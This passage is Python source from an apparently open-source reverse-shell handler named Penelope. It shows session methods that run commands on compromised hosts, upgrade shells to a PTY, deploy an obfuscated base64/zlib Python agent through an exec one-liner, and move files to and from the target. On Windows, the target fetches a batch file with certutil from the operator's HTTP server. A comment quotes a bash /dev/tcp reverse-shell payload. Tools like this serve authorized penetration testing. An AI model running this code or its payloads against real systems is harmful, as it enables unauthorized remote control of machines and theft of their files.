				self.type = 'Raw'
				self.subtype = 'cmd'
				self.interactive = True
				self.echoing = True
				prompt = re.search(r"\r\n\r\n([a-zA-Z]:\\.*>)", response, re.MULTILINE)
				self.prompt = prompt[1].encode() if prompt else b""
				win_version = re.search(r"Microsoft Windows \[.* (.*)\]", response, re.DOTALL)
				if win_version:
					self.win_version = win_version[1]

			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in response or \
					re.search('PS.*>', response, re.DOTALL):
				self.OS = 'Windows'
				self.type = 'Raw'
				self.subtype = 'psh'
				self.interactive = True
				self.echoing = False
				self.prompt = response.splitlines()[-1].encode()
		else:
			return False

		if self.OS == 'Windows' and '\x1b' in response:
			self.type = 'PTY'
			self.echoing = True
			columns, lines = shutil.get_terminal_size()
			cmd = (
				f"$width={columns}; $height={lines}; "
				"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); "
				"$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size "
				"-ArgumentList ($width, $height)"
			)
			self.exec(cmd)
			self.prompt = response.split()[-1].encode()

		self.get_shell_info(silent=True)
		if self.tty:
			self.type = 'PTY'
		if self.type == 'PTY':
			self.pty_ready = True
		return True

	def exec(
		self,
		cmd=None, 		# The command line to run
		raw=False, 		# Delimiters
		value=False,		# Will use the output elsewhere?
		timeout=False,		# Timeout
		expect_func=None,	# Function that determines what to wait for in the response
		force_cmd=False,	# Execute cmd command from powershell
		separate=False,		# If true, send cmd via this method but receive with TLV method (agent)
					# --- Agent only args ---
		agent_typing=False,	# Simulate typing on shell
		python=False,		# Execute python command
		stdin_src=None,		# stdin stream source
		stdout_dst=None,	# stdout stream destination
		stderr_dst=None,	# stderr stream destination
		stdin_stream=None,	# stdin_stream object
		stdout_stream=None,	# stdout_stream object
		stderr_stream=None,	# stderr_stream object
		agent_control=None	# control queue
	):
		if self.agent and not agent_typing: # TODO environment will not be the same as shell
			if cmd:
				cmd = dedent(cmd)
				if value:
					buffer = io.BytesIO()
				timeout = options.short_timeout if value else None

				if not stdin_stream:
					stdin_stream = self.new_streamID
					if not stdin_stream:
						return
				if not stdout_stream:
					stdout_stream = self.new_streamID
					if not stdout_stream:
						return
				if not stderr_stream:
					stderr_stream = self.new_streamID
					if not stderr_stream:
						return

				_type = 'S'.encode() if not python else 'P'.encode()
				self.send(Messenger.message(
					Messenger.EXEC, _type +
					stdin_stream.id +
					stdout_stream.id +
					stderr_stream.id +
					cmd.encode()
				))
				logger.debug(cmd)
				#print(stdin_stream.id, stdout_stream.id, stderr_stream.id)

				rlist = []
				if stdin_src:
					rlist.append(stdin_src)
				if stdout_dst or value:
					rlist.append(stdout_stream)
				if stderr_dst or value:
					rlist.append(stderr_stream) # FIX
				if not rlist:
					return True

				#rlist = [self.subchannel.control, stdout_stream, stderr_stream]
				#if stdin_src:
				#	rlist.append(stdin_src)

				if not agent_control:
					agent_control = self.subchannel.control # TEMP
				rlist.append(agent_control)
				while rlist != [agent_control]:
					r, _, _ = select(rlist, [], [], timeout)
					timeout = None

					if not r:
						#stdin_stream.terminate()
						#stdout_stream.terminate()
						#stderr_stream.terminate()
						break # TODO need to clear everything first

					for readable in r:

						if readable is agent_control:
							command = agent_control.get()
							if command == 'stop':
								# TODO kill task here...
								break

						if readable is stdin_src:
							if hasattr(stdin_src, 'read'): # FIX
								data = stdin_src.read(options.network_buffer_size)
							elif hasattr(stdin_src, 'recv'):
								try:
									data = stdin_src.recv(options.network_buffer_size)
								except OSError:
									pass # TEEEEMP
							stdin_stream.write(data)
							if not data:
								#stdin_stream << b""
								rlist.remove(stdin_src)

						if readable is stdout_stream:
							data = readable.read(options.network_buffer_size)
							if value:
								buffer.write(data)
							elif stdout_dst:
								if hasattr(stdout_dst, 'write'): # FIX
									stdout_dst.write(data)
									stdout_dst.flush()
								elif hasattr(stdout_dst, 'sendall'):
									try:
										stdout_dst.sendall(data) # maybe broken pipe
										if not data:
											if stdout_dst in rlist:
												rlist.remove(stdout_dst)
									except:
										if stdout_dst in rlist:
											rlist.remove(stdout_dst)
							if not data:
								rlist.remove(readable)
								del self.streams[readable.id]

						if readable is stderr_stream:
							data = readable.read(options.network_buffer_size)
							if value:
								buffer.write(data)
							elif stderr_dst:
								if hasattr(stderr_dst, 'write'): # FIX
									stderr_dst.write(data)
									stderr_dst.flush()
								elif hasattr(stderr_dst, 'sendall'):
									try:
										stderr_dst.sendall(data) # maybe broken pipe
										if not data:
											if stderr_dst in rlist:
												rlist.remove(stderr_dst)
									except:
										if stderr_dst in rlist:
											rlist.remove(stderr_dst)
							if not data:
								rlist.remove(readable)
								del self.streams[readable.id]
					else:
						continue
					break

				stdin_stream << b"" # TOCHECK
				stdin_stream.write(b"")
				os.close(stdin_stream._read)
				del self.streams[stdin_stream.id]

				return buffer.getvalue().rstrip().decode(errors="replace") if value else True
			return None

		with self.lock:
			if self.need_control_session:
				args = locals()
				del args['self']
				try:
					response = self.control_session.exec(**args)
					return response
				except AttributeError: # No control session
					logger.error("Spawn MANUALLY a new shell for this session to operate properly")
					return None

			if not self or not self.subchannel.can_use:
				logger.debug("Exec: The session is killed")
				return False

			self.subchannel.control.clear()
			self.subchannel.active = True
			self.subchannel.result = None
			buffer = io.BytesIO()
			_start = time.perf_counter()

			# Constructing the payload
			if cmd is not None:
				if force_cmd and self.subtype == 'psh':
					cmd = f"cmd /c '{cmd}'"
				initial_cmd = cmd
				cmd = cmd.encode()

				if raw:
					if self.OS == 'Unix':
						echoed_cmd_regex = rb' ' + re.escape(cmd) + rb'\r?\n'
						cmd = b' ' + cmd + b'\n'

					elif self.OS == 'Windows':
						cmd = cmd + b'\r\n'
						echoed_cmd_regex = re.escape(cmd)
				else:
					token = [rand(10) for _ in range(4)]

					if self.OS == 'Unix':
						cmd = (
							f" {token[0]}={token[1]} {token[2]}={token[3]};"
							f"printf ${token[0]}${token[2]};"
							f"{cmd.decode()};"
							f"printf ${token[2]}${token[0]}\n".encode()
						)

					elif self.OS == 'Windows': # TODO fix logic
						if self.subtype == 'cmd':
							cmd = (
								f"set {token[0]}={token[1]}&set {token[2]}={token[3]}\r\n"
								f"echo %{token[0]}%%{token[2]}%&{cmd.decode()}&"
								f"echo %{token[2]}%%{token[0]}%\r\n".encode()
							)
						elif self.subtype == 'psh':
							cmd = (
								f"$env:{token[0]}=\"{token[1]}\";$env:{token[2]}=\"{token[3]}\"\r\n"
								f"echo $env:{token[0]}$env:{token[2]};{cmd.decode()};"
								f"echo $env:{token[2]}$env:{token[0]}\r\n".encode()
							)
						# TODO check the maxlength on powershell
						if self.subtype == 'cmd' and len(cmd) > MAX_CMD_PROMPT_LEN:
							logger.error(f"Max cmd prompt length: {MAX_CMD_PROMPT_LEN} characters")
							return False

					self.subchannel.pattern = re.compile(
						rf"{token[1]}{token[3]}(.*){token[3]}{token[1]}"
						rf"{'.' if self.interactive else ''}".encode(), re.DOTALL)

				logger.debug(f"\n\n{paint(f'Command for session {self.id}').YELLOW}: {initial_cmd}")
				logger.debug(f"{paint('Command sent').yellow}: {cmd.decode()}")
				if self.agent and agent_typing:
					cmd = Messenger.message(Messenger.SHELL, cmd)
				self.send(cmd)
				self.subchannel.allow_receive_shell_data = False # TODO

			data_timeout = options.short_timeout if timeout is False else timeout
			continuation_timeout = options.latency
			timeout = data_timeout

			last_data = time.perf_counter()
			need_check = False
			try:
				while self.subchannel.result is None:
					logger.debug(paint(f"Waiting for data (timeout={timeout})...").blue)
					readables, _, _ = select([self.subchannel.control, self.subchannel], [], [], timeout)

					if self.subchannel.control in readables:
						command = self.subchannel.control.get()
						logger.debug(f"Subchannel Control Queue: {command}")

						if command == 'stop':
							self.subchannel.result = False
							break

					if self.subchannel in readables:
						logger.debug(f"Latency: {time.perf_counter() - last_data}")
						last_data = time.perf_counter()

						data = self.subchannel.read()
						buffer.write(data)
						logger.debug(f"{paint('Received').GREEN} -> {data}")

						if timeout == data_timeout:
							timeout = continuation_timeout
							need_check = True

					else:
						if timeout == data_timeout:
							logger.debug(paint("TIMEOUT").RED)
							self.subchannel.result = False
							break
						else:
							need_check = True
							timeout = data_timeout

					if need_check:
						need_check = False

						if raw and self.echoing and cmd:
							result = buffer.getvalue()
							if re.search(echoed_cmd_regex + (b'.' if self.interactive else b''), result, re.DOTALL):
								self.subchannel.result = re.sub(echoed_cmd_regex, b'', result)
								break
							else:
								logger.debug("The echoable is not exhausted")
								continue
						if not raw:
							check = self.subchannel.pattern.search(buffer.getvalue())
							if check:
								logger.debug(paint('Got all data!').green)
								self.subchannel.result = check[1]
								break
							logger.debug(paint('We didn\'t get all data; continue receiving').yellow)

						elif expect_func:
							if expect_func(buffer.getvalue()):
								logger.debug(paint("The expected strings found in data").yellow)
								self.subchannel.result = buffer.getvalue()
							else:
								logger.debug(paint('No expected strings found in data. Receive again...').yellow)

						else:
							logger.debug(paint('Maybe got all data !?').yellow)
							self.subchannel.result = buffer.getvalue()
							break
			except:
				self.subchannel.can_use = False
				self.subchannel.result = False

			_stop = time.perf_counter()
			logger.debug(f"{paint('FINAL TIME: ').white_BLUE}{_stop - _start}")

			if value and self.subchannel.result is not False:
				if self.OS == 'Windows' and self.type == 'PTY': # quirk
					self.subchannel.result = re.sub(rb'\x1b\[(?:K|\?25h|25l|82X)', b'', self.subchannel.result)
				self.subchannel.result = self.subchannel.result.strip().decode(errors="replace") # TODO check strip
			logger.debug(f"{paint('FINAL RESPONSE: ').white_BLUE}{self.subchannel.result}")
			self.subchannel.active = False

			if separate and self.subchannel.result:
				self.subchannel.result = re.search(rb"..\x01.*", self.subchannel.result, re.DOTALL)[0]
				buffer = io.BytesIO()
				for _type, _value in self.messenger.feed(self.subchannel.result):
					buffer.write(_value)
				return buffer.getvalue()

			return self.subchannel.result

	def need_binary(self, name, url):
		options = (
			f"\n  1) Upload {paint(url).blue}{paint().magenta}"
			f"\n  2) Upload local {name} binary"
			f"\n  3) Specify remote {name} binary path"
			 "\n  4) None of the above\n"
		)
		print(paint(options).magenta)
		answer = ask("Select action: ")

		if answer == "1":
			return self.upload(url, remote_path="/var/tmp")[0]

		elif answer == "2":
			local_path = ask(f"Enter {name} local path: ")
			if local_path:
				if os.path.exists(local_path):
					return self.upload(local_path, remote_path=self.tmp)[0]
				else:
					logger.error("The local path does not exist...")

		elif answer == "3":
			remote_path = ask(f"Enter {name} remote path: ")
			if remote_path:
				if not self.exec(f"test -f {remote_path} || echo x"):
					return remote_path
				else:
					logger.error("The remote path does not exist...")

		elif answer == "4":
			return False

		return self.need_binary(name, url)

	def upgrade(self):
		self.upgrade_attempted = True
		if self.OS == "Unix":
			if self.agent:
				logger.warning("Python Agent is already deployed")
				return False

			if self.host_needs_control_session and self.host_control_sessions == [self]:
				logger.warning("This is a control session and cannot be upgraded")
				return False

			if self.pty_ready:
				if self.can_deploy_agent:
					logger.info("Attempting to deploy Python Agent...")
				else:
					logger.warning("This shell is already PTY")
			else:
				logger.info("Attempting to upgrade shell to PTY...")

			self.shell = self.bin['bash'] or self.bin['sh']
			if not self.shell:
				logger.warning("Cannot detect shell. Abort upgrading...")
				return False

			if self.can_deploy_agent:
				_bin = self.bin['python3'] or self.bin['python']
				if self.remote_python_version >= (3,):
					_decode = 'b64decode'
					_exec = 'exec(cmd, globals(), locals())'
				else:
					_decode = 'decodestring'
					_exec = 'exec cmd in globals(), locals()'

				agent = dedent('\n'.join(AGENT.splitlines()[1:])).format(
					self.shell,
					options.network_buffer_size,
					MESSENGER,
					STREAM,
					self.bin['sh'] or self.bin['bash'],
					_exec
				)
				payload = base64.b64encode(compress(agent.encode(), 9)).decode()
				cmd = f'{_bin} -Wignore -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''

			elif not self.pty_ready:
				socat_cmd = f"{{}} - exec:{self.shell},pty,stderr,setsid,sigint,sane;exit 0"
				if self.bin['script']:
					_bin = self.bin['script']
					cmd = f"{_bin} -q /dev/null; exit 0"

				elif self.bin['socat']:
					_bin = self.bin['socat']
					cmd = socat_cmd.format(_bin)

				else:
					_bin = "/var/tmp/socat"
					if not self.exec(f"test -f {_bin} || echo x"): # TODO maybe needs rstrip
						cmd = socat_cmd.format(_bin)
					else:
						logger.warning("Cannot upgrade shell with the available binaries...")
						socat_binary = self.need_binary("socat", URLS['socat'])
						if socat_binary:
							_bin = socat_binary
							cmd = socat_cmd.format(_bin)
						else:
							if readline:
								logger.info("Readline support enabled")
								self.type = 'Readline'
								return True
							else:
								logger.error("Falling back to Raw shell")
								return False

			if not self.can_deploy_agent and not self.spare_control_sessions:
				logger.warning("Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY")
				core.session_wait_host = self.name
				self.spawn()
				try:
					new_session = core.sessions[core.session_wait.get(timeout=options.short_timeout)]
					core.session_wait_host = None

				except queue.Empty:
					logger.error("Failed spawning new session")
					return False

				if self.pty_ready:
					return True

			if self.pty_ready:
				self.exec("stty -echo")
				self.echoing = False

			elif self.interactive:
				# Some shells are unstable in interactive mode
				# For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
				# Silently convert the shell to non-interactive before PTY upgrade.
				self.interactive = False
				self.echoing = True
				self.exec(f"exec {self.shell}", raw=True)
				self.echoing = False

			response = self.exec(
				f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}',
				separate=self.can_deploy_agent,
				expect_func=lambda data: not self.can_deploy_agent or b"\x01" in data,
				raw=True
			)
			if self.can_deploy_agent and not isinstance(response, bytes):
				logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will not try to deploy agent")
				Path(self.directory / ".noagent").touch()
				self.kill()
				return False

			logger.info(f"Shell upgraded successfully using {paint(_bin).yellow}{paint().green}! {EMOJIS['upgrade']}")

			self.agent = self.can_deploy_agent
			self.type = 'PTY'
			self.interactive = True
			self.echoing = True
			self.prompt = response

			self.get_shell_info()

			if _bin == self.bin['script']:
				self.exec("stty sane")

		elif self.OS == "Windows":
			if self.type != 'PTY':
				self.type = 'Readline'
				logger.info("Added readline support...")

		return True

	def update_pty_size(self):
		columns, lines = shutil.get_terminal_size()
		if self.OS == 'Unix':
			if self.agent:
				self.send(Messenger.message(Messenger.RESIZE, struct.pack("HH", lines, columns)))
			else: # TODO
				threading.Thread(
					target=self.exec,
					args=(f"stty rows {lines} columns {columns} < {self.tty}",),
					name="RESIZE"
				).start() #TEMP
		elif self.OS == 'Windows': # TODO
			pass

	def readline_loop(self):
		while core.attached_session == self:
			try:
				cmd = input("\033[s\033[u", self.histfile, options.histlength, None, "\t") # TODO
				if self.subtype == 'cmd':
					assert len(cmd) <= MAX_CMD_PROMPT_LEN
				#self.record(b"\n" + cmd.encode(), _input=True)

			except EOFError:
				self.detach()
				break
			except AssertionError:
				logger.error(f"Maximum prompt length is {MAX_CMD_PROMPT_LEN} characters. Current prompt is {len(cmd)}")
			else:
				self.send(cmd.encode() + b"\n")

	def attach(self):
		if threading.current_thread().name != 'Core':
			if self.new:
				upgrade_conditions = [
					not options.no_upgrade,
					not (self.need_control_session and self.host_control_sessions == [self]),
					not self.upgrade_attempted
				]
				if all(upgrade_conditions):
					self.upgrade()
				if self.prompt:
					self.record(self.prompt)
				self.new = False

			core.control << f'self.sessions[{self.id}].attach()'
			menu.active.clear() # Redundant but safeguard
			return True

		if core.attached_session is not None:
			return False

		if self.type == 'PTY':
			escape_key = options.escape['key']
		elif self.type == 'Readline':
			escape_key = 'Ctrl-D'
		else:
			escape_key = 'Ctrl-C'

		logger.info(
			f"Interacting with session {paint('[' + str(self.id) + ']').red}"
			f"{paint(', Shell Type:').green} {paint(self.type).CYAN}{paint(', Menu key:').green} "
			f"{paint(escape_key).MAGENTA} "
		)

		if not options.no_log:
			logger.info(f"Logging to {paint(self.logpath).yellow_DIM} {EMOJIS['logfile']}")
		print(paint('─').DIM * shutil.get_terminal_size()[0])

		core.attached_session = self
		core.rlist.append(sys.stdin)

		stdout(bytes(self.last_lines))

		if self.type == 'PTY':
			tty.setraw(sys.stdin)
			os.kill(os.getpid(), signal.SIGWINCH)

		elif self.type == 'Readline':
			threading.Thread(target=self.readline_loop).start()

		self._cwd = None
		return True

	def sync_cwd(self):
		self._cwd = None
		if self.agent:
			self.exec(f"os.chdir('{self.cwd}')", python=True, value=True)
		elif self.need_control_session:
			self.exec(f"cd {self.cwd}")

	def get_subtype(self):
		response = self.exec("$PSVersionTable", expect_func=lambda x: b":\\" in x, raw=True)
		if response:
			if b"SerializationVersion" in response:
				self.subtype = 'psh'
			else:
				self.subtype = 'cmd'

	def detach(self):
		if self and self.OS == 'Unix' and (self.agent or self.need_control_session):
			threading.Thread(target=self.sync_cwd).start()

		if self and self.OS == 'Windows' and self.type != 'PTY':
			threading.Thread(target=self.get_subtype).start()

		if threading.current_thread().name != 'Core':
			core.control << f'self.sessions[{self.id}].detach()'
			return

		if core.attached_session is None:
			return False

		core.wait_input = False
		core.attached_session = None
		core.rlist.remove(sys.stdin)

		if self.type == 'PTY':
			termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)

		if self.id in core.sessions:
			print()
			logger.warning("Session detached ⇲")
			menu.set_id(self.id)
		else:
			if options.single_session and not core.sessions:
				core.stop()
				logger.info("Penelope exited due to Single Session mode")
				return
			menu.set_id(None)
		menu.show()

		return True

	def download(self, remote_items):
		# Initialization
		try:
			shlex.split(remote_items) # Early check for shlex errors
		except ValueError as e:
			logger.error(e)
			return []

		local_download_folder = self.directory / "downloads"
		try:
			local_download_folder.mkdir(parents=True, exist_ok=True)
		except Exception as e:
			logger.error(e)
			return []

		if self.OS == 'Unix':
			# Check for local available space
			available_bytes = shutil.disk_usage(local_download_folder).free
			if self.agent:
				block_size = os.statvfs(local_download_folder).f_frsize
				response = self.exec(f"{GET_GLOB_SIZE}"
					f"stdout_stream << str(get_glob_size({repr(remote_items)}, {block_size})).encode()",
					python=True,
					value=True
				)
				try:
					remote_size = int(float(response))
				except:
					logger.error(response)
					return []
			else:
				cmd = f"du -ck {remote_items}"
				response = self.exec(cmd, timeout=None, value=True)
				if not response:
					logger.error("Cannot determine remote size")
					return []
				#errors = [line[4:] for line in response.splitlines() if line.startswith('du: ')]
				#for error in errors:
				#	logger.error(error)
				remote_size = int(response.splitlines()[-1].split()[0]) * 1024

			need = remote_size - available_bytes

			if need > 0:
				logger.error(
					f"--- Not enough space to download... {paint('We need ').blue}"
					f"{paint().yellow}{need:,}{paint().blue} more bytes..."
				)
				return []

			# Packing and downloading
			if self.agent:
				stdin_stream = self.new_streamID
				stdout_stream = self.new_streamID
				stderr_stream = self.new_streamID

				if not all([stdout_stream, stderr_stream]):
					return

				code = fr"""
				from glob import glob
				items = []
				for part in shlex.split({repr(remote_items)}):
					_items = glob(normalize_path(part))
					if _items:
						items.extend(_items)
					else:
						items.append(part)
				import tarfile
				if hasattr(tarfile, 'DEFAULT_FORMAT'):
					tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
				else:
					tarfile.TarFile.posix = True
				tar = tarfile.open(name="", mode='w|gz', fileobj=stdout_stream)
				def handle_exceptions(func):
					def inner(*args, **kwargs):
						try:
							func(*args, **kwargs)
						except:
							stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
					return inner
				tar.add = handle_exceptions(tar.add)
				for item in items:
					try:
						tar.add(os.path.abspath(item))
					except:
						stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
				tar.close()
				"""

				threading.Thread(target=self.exec, args=(code, ), kwargs={
					'python': True,
					'stdin_stream': stdin_stream,
					'stdout_stream': stdout_stream,
					'stderr_stream': stderr_stream
				}).start()

				error_buffer = ''
				while True:
					r, _, _ = select([stderr_stream], [], [])
					data = stderr_stream.read(options.network_buffer_size)
					if data:
						error_buffer += data.decode()
						while '\n' in error_buffer:
							line, error_buffer = error_buffer.split('\n', 1)
							logger.error(str(paint("<REMOTE>").cyan) + " " + str(paint(line).red))
					else:
						break

				tar_source, mode = stdout_stream, "r|gz"
			else:
				remote_items = ' '.join([os.path.join(self.cwd, part) for part in shlex.split(remote_items)])
				temp = self.tmp + "/" + rand(8)
				cmd = rf'tar -czf - -h {remote_items}|base64|tr -d "\n" > {temp}'
				response = self.exec(cmd, timeout=None, value=True)
				if response is False:
					logger.error("Cannot create archive")
					return []
				errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
				for error in errors:
					logger.error(error)
				send_size = int(self.exec(rf"(stat -x {temp} 2>/dev/null || stat {temp}) | sed -n 's/.*Size: \([0-9]*\).*/\1/p'"))

				b64data = io.BytesIO()
				for offset in range(0, send_size, options.download_chunk_size):
					response = self.exec(f"cut -c{offset + 1}-{offset + options.download_chunk_size} {temp}")
					if response is False:
						logger.error("Download interrupted")
						return []
					b64data.write(response)
				self.exec(f"rm {temp}")

				data = io.BytesIO()
				data.write(base64.b64decode(b64data.getvalue()))
				data.seek(0)

				tar_source, mode = data, "r:gz"

			#print(remote_size)
			#if not remote_size:
			#	return []

			# Local extraction
			try:
				tar = tarfile.open(mode=mode, fileobj=tar_source)
			except:
				logger.error("Invalid data returned")
				return []

			def add_w(func):
				def inner(*args, **kwargs):
					args[0].mode |= 0o200
					func(*args, **kwargs)
				return inner

			tar._extract_member = add_w(tar._extract_member)

			with warnings.catch_warnings():
				warnings.simplefilter("ignore", category=DeprecationWarning)
				try:
					tar.extractall(local_download_folder)
				except Exception as e:
					logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
			tar.close()

			if self.agent:
				stdin_stream.write(b"")
				os.close(stdin_stream._read)
				os.close(stdin_stream._write)
				del self.streams[stdin_stream.id]
				os.close(stdout_stream._read)
				del self.streams[stdout_stream.id]
				del self.streams[stderr_stream.id]

				# Get the remote absolute paths
				response = self.exec(f"""
				from glob import glob
				remote_paths = ''
				for part in shlex.split({repr(remote_items)}):
					result = glob(normalize_path(part))
					if result:
						for item in result:
							if os.path.exists(item):
								remote_paths += os.path.abspath(item) + "\\n"
					else:
						remote_paths += part + "\\n"
				stdout_stream << remote_paths.encode()
				""", python=True, value=True)
			else:
				cmd = f'for file in {remote_items}; do if [ -e "$file" ]; then readlink -f "$file"; else echo "$file"; fi; done'
				response = self.exec(cmd, timeout=None, value=True)
				if not response:
					logger.error("Cannot get remote paths")
					return []

			remote_paths = response.splitlines()

			# Present the downloads
			downloaded = []
			for path in remote_paths:
				local_path = local_download_folder / path[1:]
				if os.path.isabs(path) and os.path.exists(local_path):
					downloaded.append(local_path)
				else:
					logger.error(f"{paint('Download Failed').RED_white} {shlex.quote(path)}")

		elif self.OS == 'Windows':
			remote_tempfile = f"{self.tmp}\\{rand(10)}.zip"
			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
			remote_items_ps = r'\", \"'.join(shlex.split(remote_items))
			cmd = (
				f'@powershell -command "$archivepath=\'{remote_tempfile}\';compress-archive -path \'{remote_items_ps}\''
				' -DestinationPath $archivepath;'
				'$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));'
				'Remove-Item $archivepath;'
				'Write-Host $b64"'
			)
			with open(tempfile_bat, "w") as f:
				f.write(cmd)

			server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
			urlpath_bat = server.add(tempfile_bat)
			temp_remote_file_bat = urlpath_bat.split("/")[-1]
			server.start()
			data = self.exec(
				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" '
				f'"%TEMP%\\{temp_remote_file_bat}" >NUL 2>&1&"%TEMP%\\{temp_remote_file_bat}"&'
				f'del "%TEMP%\\{temp_remote_file_bat}"',
				force_cmd=True, value=True, timeout=None)
			server.stop()

			if not data:
				return []
			downloaded = set()
			try:
				with zipfile.ZipFile(io.BytesIO(base64.b64decode(data)), 'r') as zipdata:
					for item in zipdata.infolist():
						item.filename = item.filename.replace('\\', '/')
						downloaded.add(Path(local_download_folder) / Path(item.filename.split('/')[0]))
						newpath = Path(zipdata.extract(item, path=local_download_folder))

			except zipfile.BadZipFile:
				logger.error("Invalid zip format")

			except binascii_error:
				logger.error("The item does not exist or access is denied")

		for item in downloaded:
			logger.info(f"{paint('Download OK').GREEN_white} {paint(shlex.quote(pathlink(item))).yellow}")

		return downloaded

	def upload(self, local_items, remote_path=None, randomize_fname=False):

		# Check remote permissions
		destination = remote_path or self.cwd
		try:
			if self.OS == 'Unix':
				if self.agent:
					if not eval(self.exec(
						f"stdout_stream << str(os.access(normalize_path('{destination}'), os.W_OK)).encode()",
						python=True,
						value=True
					)):
						logger.error(f"{destination}: Permission denied")
						return []
				else:
					if destination.startswith('~'):
						destination = self.exec(f"echo {destination}", value=True)
					if int(self.exec(f"[ -w \"{destination}\" ];echo $?", value=True)):
						logger.error(f"{destination}: Permission denied")
						return []
			elif self.OS == 'Windows':
				pass # TODO
		except Exception as e:
			logger.error(e)
			logger.warning("Cannot check remote permissions. Aborting...")
			return []

		# Initialization
		try:
			local_items = [item if re.match(r'(http|ftp)s?://', item, re.IGNORECASE)\
				 else normalize_path(item) for item in shlex.split(local_items)]

		except ValueError as e:
			logger.error(e)
			return []

		# Check for necessary binaries
		if self.OS == 'Unix' and not self.agent:
			dependencies = ['echo', 'base64', 'tar', 'rm']
			for binary in dependencies:
				if not self.bin[binary]:
					logger.error(f"'{binary}' binary is not available at the target. Cannot upload...")
					return []

		# Resolve items
		resolved_items = []
		for item in local_items:
			# Download URL
			if re.match(r'(http|ftp)s?://', item, re.IGNORECASE):
				try:
					filename, item = url_to_bytes(item)
					if not item:
						continue
					resolved_items.append((filename, item))
				except Exception as e:
					logger.error(e)
			else:
				if os.path.isabs(item):
					items = list(Path('/').glob(item.lstrip('/')))
				else:
					items = list(Path().glob(item))
				if items:
					resolved_items.extend(items)
				else:
					logger.error(f"No such file or directory: {item}")

		if not resolved_items:
			return []

		if self.OS == 'Unix':
			# Get remote available space
			if self.agent:
				response = self.exec(f"""
				stats = os.statvfs(normalize_path('{destination}'))
				stdout_stream << (str(stats.f_bavail) + ';' + str(stats.f_frsize)).encode()
				""", python=True, value=True)

				remote_available_blocks, remote_block_size = map(int, response.split(';'))
				remote_space = remote_available_blocks * remote_block_size
			else:
				remote_block_size = int(self.exec(rf'stat -c "%o" {destination} 2>/dev/null || stat -f "%k" {destination}', value=True))
				remote_space = int(self.exec(f"df -k {destination}|tail -1|awk '{{print $4}}'", value=True)) * 1024

			# Calculate local size
			local_size = 0
			for item in resolved_items:
				if isinstance(item, tuple):
					local_size += ceil(len(item[1]) / remote_block_size) * remote_block_size
				else:
					local_size += get_glob_size(str(item), remote_block_size)

			# Check required space
			need = local_size - remote_space
			if need > 0:
				logger.error(
					f"--- Not enough space on target... {paint('We need ').blue}"
					f"{paint().yellow}{need:,}{paint().blue} more bytes..."
				)
				return []

			# Start Uploading
			if self.agent:
				stdin_stream = self.new_streamID
				stdout_stream = self.new_streamID
				stderr_stream = self.new_streamID

				if not all([stdin_stream, stderr_stream]):
					return

				code = rf"""
				import tarfile
				if hasattr(tarfile, 'DEFAULT_FORMAT'):
					tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
				else:
					tarfile.TarFile.posix = True
				tar = tarfile.open(name='', mode='r|gz', fileobj=stdin_stream)
				tar.errorlevel = 1
				for item in tar:
					try:
						tar.extract(item, path=normalize_path('{destination}'))
					except:
						stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
				tar.close()
				"""
				threading.Thread(target=self.exec, args=(code, ), kwargs={
					'python': True,
					'stdin_stream': stdin_stream,
					'stdout_stream': stdout_stream,
					'stderr_stream': stderr_stream
				}).start()

				tar_destination, mode = stdin_stream, "r|gz"
			else:
				tar_buffer = io.BytesIO()
				tar_destination, mode = tar_buffer, "r:gz"

			tar = tarfile.open(mode='w|gz', fileobj=tar_destination)

			def handle_exceptions(func):
				def inner(*args, **kwargs):
					try:
						func(*args, **kwargs)
					except Exception as e:
						logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
				return inner
			tar.add = handle_exceptions(tar.add)

			altnames = []
			for item in resolved_items:
				if isinstance(item, tuple):
					filename, data = item

					if randomize_fname:
						filename = Path(filename)
						altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
					else:
						altname = filename

					file = tarfile.TarInfo(name=altname)
					file.size = len(data)
					file.mode = 0o770
					file.mtime = int(time.time())

					tar.addfile(file, io.BytesIO(data))
				else:
					altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
					tar.add(item, arcname=altname)
				altnames.append(altname)
			tar.close()

			if self.agent:
				stdin_stream.write(b"")
				error_buffer = ''
				while True:
					r, _, _ = select([stderr_stream], [], [])
					data = stderr_stream.read(options.network_buffer_size)
					if data:
						error_buffer += data.decode()
						while '\n' in error_buffer:
							line, error_buffer = error_buffer.split('\n', 1)
							logger.error(str(paint("<REMOTE>").cyan) + " " + str(paint(line).red))
					else:
						break
				os.close(stdin_stream._read)
				os.close(stdin_stream._write)
				os.close(stdout_stream._read)
				del self.streams[stdin_stream.id]
				del self.streams[stdout_stream.id]
				del self.streams[stderr_stream.id]

			else: # TODO
				tar_buffer.seek(0)
				data = base64.b64encode(tar_buffer.read()).decode()
				temp = self.tmp + "/" + rand(8)

				for chunk in chunks(data, options.upload_chunk_size):
					response = self.exec(f"printf {chunk} >> {temp}")
					if response is False:
						#progress_bar.terminate()
						logger.error("Upload interrupted")
						return [] # TODO
					#progress_bar.update(len(chunk))

				#logger.info(paint("--- Remote unpacking...").blue)
				dest = f"-C {remote_path}" if remote_path else ""
				cmd = f"base64 -d < {temp} | tar xz {dest} 2>&1; temp=$?"
				response = self.exec(cmd, value=True)
				exit_code = int(self.exec("echo $temp", value=True))
				self.exec(f"rm {temp}")
				if exit_code:
					logger.error(response)
					return [] # TODO

